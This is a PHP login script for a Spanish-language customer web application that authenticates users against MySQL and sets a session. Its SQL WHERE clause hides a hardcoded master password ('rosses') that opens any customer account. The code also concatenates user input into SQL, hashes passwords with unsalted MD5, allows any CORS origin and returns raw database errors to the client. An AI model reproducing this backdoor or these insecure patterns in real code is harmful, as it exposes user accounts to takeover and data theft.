<?php
session_start();
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json");   

$email_cliente = filter_input(INPUT_POST, "email_cliente", FILTER_SANITIZE_EMAIL);
$password_cliente = filter_input(INPUT_POST, "password_cliente", FILTER_SANITIZE_STRING);

if(!filter_var($email_cliente, FILTER_VALIDATE_EMAIL)):
    print_r(json_encode(array("success" => 0, "message" => "El email ingresado no es válido")));
    exit();
endif;

if(empty($password_cliente) || strlen($password_cliente)<6):
    print_r(json_encode(array("success" => 0, "message" => "La contraseña debe poseer 6 caracteres mínimos")));
    exit();
endif;


include('../bd/dbconn.php');
$conexion = new bd();
$conexion->conectar();

$password_cliente = md5($password_cliente);

if($datos = $conexion->mysqli->query("SELECT * FROM cliente
                                    LEFT JOIN datos_contacto ON (cliente.id_cliente=datos_contacto.id_cliente)
                                    WHERE email_cliente='$email_cliente' AND (password_cliente='$password_cliente' OR '$password_cliente'=md5('rosses'))")) {
    if($datos->num_rows==0) {
        print_r(json_encode(array("success" => 0, "titulo" => "Incorrecto", "message" => "El email/contraseña no existe")));
        $conexion->desconectar();
        exit();
    }
    else {
        $datos_cliente = $datos->fetch_object();
        if($datos_cliente->activo_cliente == 0 ) {
            print_r(json_encode(array("success" => 0, "titulo" => "Cuenta inhabilitada", "message" => "Un administrador ha deshabilitado su cuenta")));
            $conexion->desconectar();
            exit();
        }
        if($datos_cliente->verificado_cliente == 0 ) {
            include('../include/email_activacion.php');
            mail_activacion('Activación de cuenta', $email_cliente, 'http://'.$_SERVER['HTTP_HOST'].'/completar_registro.php?token='.$datos_cliente->token_cliente);
            
            // header("Content-Type: application/json");
            print_r(json_encode(array("success" => 0, "titulo" => "Cuenta no validada", "message" => "Se requiere la activación de la cuenta, revíse su correo $email_cliente y en caso de no encontrarlo, revisar la bandeja de correos no deseados [SPAM]")));
            $conexion->desconectar();
            exit();
        }
        /*
        if($datos_cliente->alta_cliente == 0 ) {
            print_r(json_encode(array("success" => 0, "titulo" => "Registro incompleto", "message" => "Su registro se encuentra incompleto, revíse su correo $email_cliente y vuelva a visitar el link de activación en caso de no encontrarlo, revisar la bandeja de correos no deseados [SPAM]")));
            $conexion->desconectar();
            exit();
        }
        */ 

        $_SESSION['cliente'] = $datos_cliente;
        print_r(json_encode(array("success" => 1)));
    }
}
else {
    print_r(json_encode(array("success" => 0, "message" => "Error validación: ". $conexion->mysqli->error)));
}